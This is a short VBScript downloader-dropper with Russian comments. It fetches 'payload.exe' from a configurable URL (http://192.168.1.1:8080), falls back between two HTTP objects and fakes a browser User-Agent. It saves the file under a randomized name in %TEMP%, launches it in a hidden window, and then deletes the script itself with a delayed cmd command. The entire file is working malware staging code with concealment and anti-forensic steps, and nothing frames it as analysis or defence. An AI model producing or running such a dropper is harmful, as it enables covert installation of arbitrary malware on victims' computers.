' ---- Единственная настройка ----
Const URL = "http://192.168.1.1:8080/payload.exe"
' --------------------------------

Dim http, data, shell, path, stream

' --- Загрузка: MSXML2 → WinHttp ---
On Error Resume Next
Set http = CreateObject("MSXML2.XMLHTTP.6.0")
http.Open "GET", URL, False
http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
http.Send

If Err.Number <> 0 Or http.Status <> 200 Then
    Err.Clear
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", URL, False
    http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    http.Send
End If

If Err.Number <> 0 Or http.Status <> 200 Then
    WScript.Quit 1
End If

data = http.ResponseBody
On Error GoTo 0

' --- Сохранение во временный файл ---
Set shell = CreateObject("WScript.Shell")
path = shell.ExpandEnvironmentStrings("%TEMP%") & "\" & _
       Right("00000000" & Hex(CLng(Timer * 1000) Xor &HDEADBEEF), 8) & ".exe"

Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write data
stream.SaveToFile path, 2
stream.Close

' --- Запуск (скрытое окно) ---
shell.Run """" & path & """", 0, False

' --- Самоудаление скрипта через 3 сек ---
shell.Run "cmd /c ping -n 3 127.0.0.1 >nul & del """ & WScript.ScriptFullName & """", 0, False
